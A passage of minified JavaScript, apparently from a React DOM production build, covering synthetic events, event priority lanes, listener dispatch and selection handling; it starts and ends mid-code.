n.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var io=null;function bl(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var ro=null,Ot=null,wt=null;function Qu(e){if(e=er(e)){if(typeof ro!="function")throw Error(P(280));var n=e.stateNode;n&&(n=Fs(n),ro(e.stateNode,e.type,n))}}function kp(e){Ot?wt?wt.push(e):wt=[e]:Ot=e}function jp(){if(Ot){var e=Ot,n=wt;if(wt=Ot=null,Qu(e),n)for(e=0;e<n.length;e++)Qu(n[e])}}function Up(e,n){return e(n)}function Vp(){}var aa=!1;function _p(e,n,t){if(aa)return e(n,t);aa=!0;try{return Up(e,n,t)}finally{aa=!1,(Ot!==null||wt!==null)&&(Vp(),jp())}}function Di(e,n){var t=e.stateNode;if(t===null)return null;var i=Fs(t);if(i===null)return null;t=i[n];e:switch(n){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(i=!i.disabled)||(e=e.type,i=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!i;break e;default:e=!1}if(e)return null;if(t&&typeof t!="function")throw Error(P(231,n,typeof t));return t}var so=!1;if(gn)try{var ni={};Object.defineProperty(ni,"passive",{get:function(){so=!0}}),window.addEventListener("test",ni,ni),window.removeEventListener("test",ni,ni)}catch{so=!1}function Fg(e,n,t,i,r,s,a,o,l){var u=Array.prototype.slice.call(arguments,3);try{n.apply(t,u)}catch(c){this.onError(c)}}var gi=!1,Yr=null,Zr=!1,ao=null,kg={onError:function(e){gi=!0,Yr=e}};function jg(e,n,t,i,r,s,a,o,l){gi=!1,Yr=null,Fg.apply(kg,arguments)}function Ug(e,n,t,i,r,s,a,o,l){if(jg.apply(this,arguments),gi){if(gi){var u=Yr;gi=!1,Yr=null}else throw Error(P(198));Zr||(Zr=!0,ao=u)}}function ft(e){var n=e,t=e;if(e.alternate)for(;n.return;)n=n.return;else{e=n;do n=e,n.flags&4098&&(t=n.return),e=n.return;while(e)}return n.tag===3?t:null}function Hp(e){if(e.tag===13){var n=e.memoizedState;if(n===null&&(e=e.alternate,e!==null&&(n=e.memoizedState)),n!==null)return n.dehydrated}return null}function Wu(e){if(ft(e)!==e)throw Error(P(188))}function Vg(e){var n=e.alternate;if(!n){if(n=ft(e),n===null)throw Error(P(188));return n!==e?null:e}for(var t=e,i=n;;){var r=t.return;if(r===null)break;var s=r.alternate;if(s===null){if(i=r.return,i!==null){t=i;continue}break}if(r.child===s.child){for(s=r.child;s;){if(s===t)return Wu(r),e;if(s===i)return Wu(r),n;s=s.sibling}throw Error(P(188))}if(t.return!==i.return)t=r,i=s;else{for(var a=!1,o=r.child;o;){if(o===t){a=!0,t=r,i=s;break}if(o===i){a=!0,i=r,t=s;break}o=o.sibling}if(!a){for(o=s.child;o;){if(o===t){a=!0,t=s,i=r;break}if(o===i){a=!0,i=s,t=r;break}o=o.sibling}if(!a)throw Error(P(189))}}if(t.alternate!==i)throw Error(P(190))}if(t.tag!==3)throw Error(P(188));return t.stateNode.current===t?e:n}function zp(e){return e=Vg(e),e!==null?Gp(e):null}function Gp(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var n=Gp(e);if(n!==null)return n;e=e.sibling}return null}var Xp=Ne.unstable_scheduleCallback,$u=Ne.unstable_cancelCallback,_g=Ne.unstable_shouldYield,Hg=Ne.unstable_requestPaint,K=Ne.unstable_now,zg=Ne.unstable_getCurrentPriorityLevel,Cl=Ne.unstable_ImmediatePriority,Qp=Ne.unstable_UserBlockingPriority,es=Ne.unstable_NormalPriority,Gg=Ne.unstable_LowPriority,Wp=Ne.unstable_IdlePriority,Ms=null,an=null;function Xg(e){if(an&&typeof an.onCommitFiberRoot=="function")try{an.onCommitFiberRoot(Ms,e,void 0,(e.current.flags&128)===128)}catch{}}var $e=Math.clz32?Math.clz32:$g,Qg=Math.log,Wg=Math.LN2;function $g(e){return e>>>=0,e===0?32:31-(Qg(e)/Wg|0)|0}var fr=64,hr=4194304;function pi(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function ns(e,n){var t=e.pendingLanes;if(t===0)return 0;var i=0,r=e.suspendedLanes,s=e.pingedLanes,a=t&268435455;if(a!==0){var o=a&~r;o!==0?i=pi(o):(s&=a,s!==0&&(i=pi(s)))}else a=t&~r,a!==0?i=pi(a):s!==0&&(i=pi(s));if(i===0)return 0;if(n!==0&&n!==i&&!(n&r)&&(r=i&-i,s=n&-n,r>=s||r===16&&(s&4194240)!==0))return n;if(i&4&&(i|=t&16),n=e.entangledLanes,n!==0)for(e=e.entanglements,n&=i;0<n;)t=31-$e(n),r=1<<t,i|=e[t],n&=~r;return i}function Kg(e,n){switch(e){case 1:case 2:case 4:return n+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return n+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function Jg(e,n){for(var t=e.suspendedLanes,i=e.pingedLanes,r=e.expirationTimes,s=e.pendingLanes;0<s;){var a=31-$e(s),o=1<<a,l=r[a];l===-1?(!(o&t)||o&i)&&(r[a]=Kg(o,n)):l<=n&&(e.expiredLanes|=o),s&=~o}}function oo(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function $p(){var e=fr;return fr<<=1,!(fr&4194240)&&(fr=64),e}function oa(e){for(var n=[],t=0;31>t;t++)n.push(e);return n}function Yi(e,n,t){e.pendingLanes|=n,n!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,n=31-$e(n),e[n]=t}function Yg(e,n){var t=e.pendingLanes&~n;e.pendingLanes=n,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=n,e.mutableReadLanes&=n,e.entangledLanes&=n,n=e.entanglements;var i=e.eventTimes;for(e=e.expirationTimes;0<t;){var r=31-$e(t),s=1<<r;n[r]=0,i[r]=-1,e[r]=-1,t&=~s}}function Al(e,n){var t=e.entangledLanes|=n;for(e=e.entanglements;t;){var i=31-$e(t),r=1<<i;r&n|e[i]&n&&(e[i]|=n),t&=~r}}var F=0;function Kp(e){return e&=-e,1<e?4<e?e&268435455?16:536870912:4:1}var Jp,El,Yp,Zp,em,lo=!1,gr=[],Nn=null,In=null,Mn=null,qi=new Map,Ni=new Map,Ln=[],Zg="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function Ku(e,n){switch(e){case"focusin":case"focusout":Nn=null;break;case"dragenter":case"dragleave":In=null;break;case"mouseover":case"mouseout":Mn=null;break;case"pointerover":case"pointerout":qi.delete(n.pointerId);break;case"gotpointercapture":case"lostpointercapture":Ni.delete(n.pointerId)}}function ti(e,n,t,i,r,s){return e===null||e.nativeEvent!==s?(e={blockedOn:n,domEventName:t,eventSystemFlags:i,nativeEvent:s,targetContainers:[r]},n!==null&&(n=er(n),n!==null&&El(n)),e):(e.eventSystemFlags|=i,n=e.targetContainers,r!==null&&n.indexOf(r)===-1&&n.push(r),e)}function ev(e,n,t,i,r){switch(n){case"focusin":return Nn=ti(Nn,e,n,t,i,r),!0;case"dragenter":return In=ti(In,e,n,t,i,r),!0;case"mouseover":return Mn=ti(Mn,e,n,t,i,r),!0;case"pointerover":var s=r.pointerId;return qi.set(s,ti(qi.get(s)||null,e,n,t,i,r)),!0;case"gotpointercapture":return s=r.pointerId,Ni.set(s,ti(Ni.get(s)||null,e,n,t,i,r)),!0}return!1}function nm(e){var n=Yn(e.target);if(n!==null){var t=ft(n);if(t!==null){if(n=t.tag,n===13){if(n=Hp(t),n!==null){e.blockedOn=n,em(e.priority,function(){Yp(t)});return}}else if(n===3&&t.stateNode.current.memoizedState.isDehydrated){e.blockedOn=t.tag===3?t.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Mr(e){if(e.blockedOn!==null)return!1;for(var n=e.targetContainers;0<n.length;){var t=uo(e.domEventName,e.eventSystemFlags,n[0],e.nativeEvent);if(t===null){t=e.nativeEvent;var i=new t.constructor(t.type,t);io=i,t.target.dispatchEvent(i),io=null}else return n=er(t),n!==null&&El(n),e.blockedOn=t,!1;n.shift()}return!0}function Ju(e,n,t){Mr(e)&&t.delete(n)}function nv(){lo=!1,Nn!==null&&Mr(Nn)&&(Nn=null),In!==null&&Mr(In)&&(In=null),Mn!==null&&Mr(Mn)&&(Mn=null),qi.forEach(Ju),Ni.forEach(Ju)}function ii(e,n){e.blockedOn===n&&(e.blockedOn=null,lo||(lo=!0,Ne.unstable_scheduleCallback(Ne.unstable_NormalPriority,nv)))}function Ii(e){function n(r){return ii(r,e)}if(0<gr.length){ii(gr[0],e);for(var t=1;t<gr.length;t++){var i=gr[t];i.blockedOn===e&&(i.blockedOn=null)}}for(Nn!==null&&ii(Nn,e),In!==null&&ii(In,e),Mn!==null&&ii(Mn,e),qi.forEach(n),Ni.forEach(n),t=0;t<Ln.length;t++)i=Ln[t],i.blockedOn===e&&(i.blockedOn=null);for(;0<Ln.length&&(t=Ln[0],t.blockedOn===null);)nm(t),t.blockedOn===null&&Ln.shift()}var Bt=bn.ReactCurrentBatchConfig,ts=!0;function tv(e,n,t,i){var r=F,s=Bt.transition;Bt.transition=null;try{F=1,Pl(e,n,t,i)}finally{F=r,Bt.transition=s}}function iv(e,n,t,i){var r=F,s=Bt.transition;Bt.transition=null;try{F=4,Pl(e,n,t,i)}finally{F=r,Bt.transition=s}}function Pl(e,n,t,i){if(ts){var r=uo(e,n,t,i);if(r===null)va(e,n,i,is,t),Ku(e,i);else if(ev(r,e,n,t,i))i.stopPropagation();else if(Ku(e,i),n&4&&-1<Zg.indexOf(e)){for(;r!==null;){var s=er(r);if(s!==null&&Jp(s),s=uo(e,n,t,i),s===null&&va(e,n,i,is,t),s===r)break;r=s}r!==null&&i.stopPropagation()}else va(e,n,i,null,t)}}var is=null;function uo(e,n,t,i){if(is=null,e=bl(i),e=Yn(e),e!==null)if(n=ft(e),n===null)e=null;else if(t=n.tag,t===13){if(e=Hp(n),e!==null)return e;e=null}else if(t===3){if(n.stateNode.current.memoizedState.isDehydrated)return n.tag===3?n.stateNode.containerInfo:null;e=null}else n!==e&&(e=null);return is=e,null}function tm(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(zg()){case Cl:return 1;case Qp:return 4;case es:case Gg:return 16;case Wp:return 536870912;default:return 16}default:return 16}}var Dn=null,Tl=null,Or=null;function im(){if(Or)return Or;var e,n=Tl,t=n.length,i,r="value"in Dn?Dn.value:Dn.textContent,s=r.length;for(e=0;e<t&&n[e]===r[e];e++);var a=t-e;for(i=1;i<=a&&n[t-i]===r[s-i];i++);return Or=r.slice(e,1<i?1-i:void 0)}function wr(e){var n=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&n===13&&(e=13)):e=n,e===10&&(e=13),32<=e||e===13?e:0}function vr(){return!0}function Yu(){return!1}function Me(e){function n(t,i,r,s,a){this._reactName=t,this._targetInst=r,this.type=i,this.nativeEvent=s,this.target=a,this.currentTarget=null;for(var o in e)e.hasOwnProperty(o)&&(t=e[o],this[o]=t?t(s):s[o]);return this.isDefaultPrevented=(s.defaultPrevented!=null?s.defaultPrevented:s.returnValue===!1)?vr:Yu,this.isPropagationStopped=Yu,this}return W(n.prototype,{preventDefault:function(){this.defaultPrevented=!0;var t=this.nativeEvent;t&&(t.preventDefault?t.preventDefault():typeof t.returnValue!="unknown"&&(t.returnValue=!1),this.isDefaultPrevented=vr)},stopPropagation:function(){var t=this.nativeEvent;t&&(t.stopPropagation?t.stopPropagation():typeof t.cancelBubble!="unknown"&&(t.cancelBubble=!0),this.isPropagationStopped=vr)},persist:function(){},isPersistent:vr}),n}var $t={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Ll=Me($t),Zi=W({},$t,{view:0,detail:0}),rv=Me(Zi),la,ua,ri,Os=W({},Zi,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Rl,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==ri&&(ri&&e.type==="mousemove"?(la=e.screenX-ri.screenX,ua=e.screenY-ri.screenY):ua=la=0,ri=e),la)},movementY:function(e){return"movementY"in e?e.movementY:ua}}),Zu=Me(Os),sv=W({},Os,{dataTransfer:0}),av=Me(sv),ov=W({},Zi,{relatedTarget:0}),ca=Me(ov),lv=W({},$t,{animationName:0,elapsedTime:0,pseudoElement:0}),uv=Me(lv),cv=W({},$t,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),dv=Me(cv),pv=W({},$t,{data:0}),ec=Me(pv),mv={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},fv={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},hv={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function gv(e){var n=this.nativeEvent;return n.getModifierState?n.getModifierState(e):(e=hv[e])?!!n[e]:!1}function Rl(){return gv}var vv=W({},Zi,{key:function(e){if(e.key){var n=mv[e.key]||e.key;if(n!=="Unidentified")return n}return e.type==="keypress"?(e=wr(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?fv[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Rl,charCode:function(e){return e.type==="keypress"?wr(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?wr(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),yv=Me(vv),xv=W({},Os,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),nc=Me(xv),Sv=W({},Zi,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Rl}),bv=Me(Sv),Cv=W({},$t,{propertyName:0,elapsedTime:0,pseudoElement:0}),Av=Me(Cv),Ev=W({},Os,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Pv=Me(Ev),Tv=[9,13,27,32],Dl=gn&&"CompositionEvent"in window,vi=null;gn&&"documentMode"in document&&(vi=document.documentMode);var Lv=gn&&"TextEvent"in window&&!vi,rm=gn&&(!Dl||vi&&8<vi&&11>=vi),tc=" ",ic=!1;function sm(e,n){switch(e){case"keyup":return Tv.indexOf(n.keyCode)!==-1;case"keydown":return n.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function am(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var St=!1;function Rv(e,n){switch(e){case"compositionend":return am(n);case"keypress":return n.which!==32?null:(ic=!0,tc);case"textInput":return e=n.data,e===tc&&ic?null:e;default:return null}}function Dv(e,n){if(St)return e==="compositionend"||!Dl&&sm(e,n)?(e=im(),Or=Tl=Dn=null,St=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(n.ctrlKey||n.altKey||n.metaKey)||n.ctrlKey&&n.altKey){if(n.char&&1<n.char.length)return n.char;if(n.which)return String.fromCharCode(n.which)}return null;case"compositionend":return rm&&n.locale!=="ko"?null:n.data;default:return null}}var qv={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function rc(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n==="input"?!!qv[e.type]:n==="textarea"}function om(e,n,t,i){kp(i),n=rs(n,"onChange"),0<n.length&&(t=new Ll("onChange","change",null,t,i),e.push({event:t,listeners:n}))}var yi=null,Mi=null;function Nv(e){ym(e,0)}function ws(e){var n=At(e);if(Np(n))return e}function Iv(e,n){if(e==="change")return n}var lm=!1;if(gn){var da;if(gn){var pa="oninput"in document;if(!pa){var sc=document.createElement("div");sc.setAttribute("oninput","return;"),pa=typeof sc.oninput=="function"}da=pa}else da=!1;lm=da&&(!document.documentMode||9<document.documentMode)}function ac(){yi&&(yi.detachEvent("onpropertychange",um),Mi=yi=null)}function um(e){if(e.propertyName==="value"&&ws(Mi)){var n=[];om(n,Mi,e,bl(e)),_p(Nv,n)}}function Mv(e,n,t){e==="focusin"?(ac(),yi=n,Mi=t,yi.attachEvent("onpropertychange",um)):e==="focusout"&&ac()}function Ov(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return ws(Mi)}function wv(e,n){if(e==="click")return ws(n)}function Bv(e,n){if(e==="input"||e==="change")return ws(n)}function Fv(e,n){return e===n&&(e!==0||1/e===1/n)||e!==e&&n!==n}var Ye=typeof Object.is=="function"?Object.is:Fv;function Oi(e,n){if(Ye(e,n))return!0;if(typeof e!="object"||e===null||typeof n!="object"||n===null)return!1;var t=Object.keys(e),i=Object.keys(n);if(t.length!==i.length)return!1;for(i=0;i<t.length;i++){var r=t[i];if(!Ga.call(n,r)||!Ye(e[r],n[r]))return!1}return!0}function oc(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function lc(e,n){var t=oc(e);e=0;for(var i;t;){if(t.nodeType===3){if(i=e+t.textContent.length,e<=n&&i>=n)return{node:t,offset:n-e};e=i}e:{for(;t;){if(t.nextSibling){t=t.nextSibling;break e}t=t.parentNode}t=void 0}t=oc(t)}}function cm(e,n){return e&&n?e===n?!0:e&&e.nodeType===3?!1:n&&n.nodeType===3?cm(e,n.parentNode):"contains"in e?e.contains(n):e.compareDocumentPosition?!!(e.compareDocumentPosition(n)&16):!1:!1}function dm(){for(var e=window,n=Jr();n instanceof e.HTMLIFrameElement;){try{var t=typeof n.contentWindow.location.href=="string"}catch{t=!1}if(t)e=n.contentWindow;else break;n=Jr(e.document)}return n}function ql(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n&&(n==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||n==="textarea"||e.contentEditable==="true")}function kv(e){var n=dm(),t=e.focusedElem,i=e.selectionRange;if(n!==t&&t&&t.ownerDocument&&cm(t.ownerDocument.documentElement,t)){if(i!==null&&ql(t)){if(n=i.start,e=i.end,e===void 0&&(e=n),"selectionStart"in t)t.selectionStart=n,t.selectionEnd=Math.min(e,t.value.length);else if(e=(n=t.ownerDocument||document)&&n.defaultView||window,e.getSelection){e=e.getSelection();var r=t.textContent.length,s=Math.min(i.start,r);i=i.end===void 0?s:Math.min(i.end,r),!e.extend&&s>i&&(r=i,i=s,s=r),r=lc(t,s);var a=lc(t,i);r&&a&&(e.rangeCount!==1||e.anchorNode!==r.node||e.anchorOffset!==r.offset||e.focusNode!==a.node||e.focusOffset!==a.offset)&&(n=n.createRange(),n.setStart(r.node,r.offset),e.removeAllRanges(),s>i?(e.addRange(n),e.extend(a.node,a.offset)):(n.setEnd(a.node,a.offset),e.addRange(n)))}}for(n=[],e=t;e=e.parentNode;)e.nodeType===1&&n.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof t.focus=="function"&&t.focus(),t=0;t<n.length;t++)e=n[t],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var jv=gn&&"documentMode"in document&&11>=document.documentMode,bt=null,co=null,xi=null,po=!1;function uc(e,n,t){var i=t.window===t?t.document:t.nodeType===9?t:t.ownerDocument;po||bt==null||bt!==Jr(i)||(i=bt,"selectionStart"in i&&ql(i)?i={start:i.selectionStart,end:i.selectionEnd}:(i=(i.ownerDocument&&i.ownerDocument.defaultView||window).getSelection(),i={anchorNode:i.anchorNode,anchorOffset:i.anchorOffset,focusNode:i.focusNode,focusOffset:i.focusOffset}),xi&&Oi(xi,i)||(xi=i,i=rs(co,"onSelect"),0<i.length&&(n=new Ll("onSelect","select",null,n,t),e.push({event:n,listeners:i}),n.target=bt)))}function yr(e,n){var t={};return t[e.toLowerCase()]=n.toLowerCase(),t["Webkit"+e]="webkit"+n,t["Moz"+e]="moz"+n,t}var Ct={animationend:yr("Animation","AnimationEnd"),animationiteration:yr("Animation","AnimationIteration"),animationstart:yr("Animation","AnimationStart"),transitionend:yr("Transition","TransitionEnd")},ma={},pm={};gn&&(pm=document.createElement("div").style,"AnimationEvent"in window||(delete Ct.animationend.animation,delete Ct.animationiteration.animation,delete Ct.animationstart.animation),"TransitionEvent"in window||delete Ct.transitionend.transition);function Bs(e){if(ma[e])return ma[e];if(!Ct[e])return e;var n=Ct[e],t;for(t in n)if(n.hasOwnProperty(t)&&t in pm)return ma[e]=n[t];return e}var mm=Bs("animationend"),fm=Bs("animationiteration"),hm=Bs("animationstart"),gm=Bs("transitionend"),vm=new Map,cc="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function _n(e,n){vm.set(e,n),mt(n,[e])}for(var fa=0;fa<cc.length;fa++){var ha=cc[fa],Uv=ha.toLowerCase(),Vv=ha[0].toUpperCase()+ha.slice(1);_n(Uv,"on"+Vv)}_n(mm,"onAnimationEnd");_n(fm,"onAnimationIteration");_n(hm,"onAnimationStart");_n("dblclick","onDoubleClick");_n("focusin","onFocus");_n("focusout","onBlur");_n(gm,"onTransitionEnd");Ut("onMouseEnter",["mouseout","mouseover"]);Ut("onMouseLeave",["mouseout","mouseover"]);Ut("onPointerEnter",["pointerout","pointerover"]);Ut("onPointerLeave",["pointerout","pointerover"]);mt("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));mt("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));mt("onBeforeInput",["compositionend","keypress","textInput","paste"]);mt("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));mt("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));mt("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var mi="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),_v=new Set("cancel close invalid load scroll toggle".split(" ").concat(mi));function dc(e,n,t){var i=e.type||"unknown-event";e.currentTarget=t,Ug(i,n,void 0,e),e.currentTarget=null}function ym(e,n){n=(n&4)!==0;for(var t=0;t<e.length;t++){var i=e[t],r=i.event;i=i.listeners;e:{var s=void 0;if(n)for(var a=i.length-1;0<=a;a--){var o=i[a],l=o.instance,u=o.currentTarget;if(o=o.listener,l!==s&&r.isPropagationStopped())break e;dc(r,o,u),s=l}else for(a=0;a<i.length;a++){if(o=i[a],l=o.instance,u=o.currentTarget,o=o.listener,l!==s&&r.isPropagationStopped())break e;dc(r,o,u),s=l}}}if(Zr)throw e=ao,Zr=!1,ao=null,e}function _(e,n){var t=n[vo];t===void 0&&(t=n[vo]=new Set);var i=e+"__bubble";t.has(i)||(xm(n,e,2,!1),t.add(i))}function ga(e,n,t){var i=0;n&&(i|=4),xm(t,e,i,n)}var xr="_reactListening"+Math.random().toString(36).slice(2);function wi(e){if(!e[xr]){e[xr]=!0,Tp.forEach(function(t){t!=="selectionchange"&&(_v.has(t)||ga(t,!1,e),ga(t,!0,e))});var n=e.nodeType===9?e:e.ownerDocument;n===null||n[xr]||(n[xr]=!0,ga("selectionchange",!1,n))}}function xm(e,n,t,i){switch(tm(n)){case 1:var r=tv;break;case 4:r=iv;break;default:r=Pl}t=r.bind(null,n,t,e),r=void 0,!so||n!=="touchstart"&&n!=="touchmove"&&n!=="wheel"||(r=!0),i?r!==void 0?e.addEventListener(n,t,{capture:!0,passive:r}):e.addEventListener(n,t,!0):r!==void 0?e.addEventListener(n,t,{passive:r}):e.addEventListener(n,t,!1)}function va(e,n,t,i,r){var s=i;if(!(n&1)&&!(n&2)&&i!==null)e:for(;;){if(i===null)return;var a=i.tag;if(a===3||a===4){var o=i.stateNode.containerInfo;if(o===r||o.nodeType===8&&o.parentNode===r)break;if(a===4)for(a=i.return;a!==null;){var l=a.tag;if((l===3||l===4)&&(l=a.stateNode.containerInfo,l===r||l.nodeType===8&&l.parentNode===r))return;a=a.return}for(;o!==null;){if(a=Yn(o),a===null)return;if(l=a.tag,l===5||l===6){i=s=a;continue e}o=o.parentNode}}i=i.return}_p(function(){var u=s,c=bl(t),d=[];e:{var p=vm.get(e);if(p!==void 0){var g=Ll,v=e;switch(e){case"keypress":if(wr(t)===0)break e;case"keydown":case"keyup":g=yv;break;case"focusin":v="focus",g=ca;break;case"focusout":v="blur",g=ca;break;case"beforeblur":case"afterblur":g=ca;break;case"click":if(t.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":g=Zu;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":g=av;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":g=bv;break;case mm:case fm:case hm:g=uv;break;case gm:g=Av;break;case"scroll":g=rv;break;case"wheel":g=Pv;break;case"copy":case"cut":case"paste":g=dv;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":g=nc}var x=(n&4)!==0,b=!x&&e==="scroll",h=x?p!==null?p+"Capture":null:p;x=[];for(var m=u,f;m!==null;){f=m;var y=f.stateNode;if(f.tag===5&&y!==null&&(f=y,h!==null&&(y=Di(m,h),y!=null&&x.push(Bi(m,y,f)))),b)break;m=m.return}0<x.length&&(p=new g(p,v,null,t,c),d.push({event:p,listeners:x}))}}if(!(n&7)){e:{if(p=e==="mouseover"||e==="pointerover",g=e==="mouseout"||e==="pointerout",p&&t!==io&&(v=t.relatedTarget||t.fromElement)&&(Yn(v)||v[vn]))break e;if((g||p)&&(p=c.window===c?c:(p=c.ownerDocument)?p.defaultView||p.parentWindow:window,g?(v=t.relatedTarget||t.toElement,g=u,v=v?Yn(v):null,v!==null&&(b=ft(v),v!==b||v.tag!==5&&v.tag!==6)&&(v=null)):(g=null,v=u),g!==v)){if(x=Zu,y="onMouseLeave",h="onMouseEnter",m="mouse",(e==="pointerout"||e==="pointerover")&&(x=nc,y="onPointerLeave",h="onPointerEnter",m="pointer"),b=g==null?p:At(g),f=v==null?p:At(v),p=new x(y,m+"leave",g,t,c),p.target=b,p.relatedTarget=f,y=null,Yn(c)===u&&(x=new 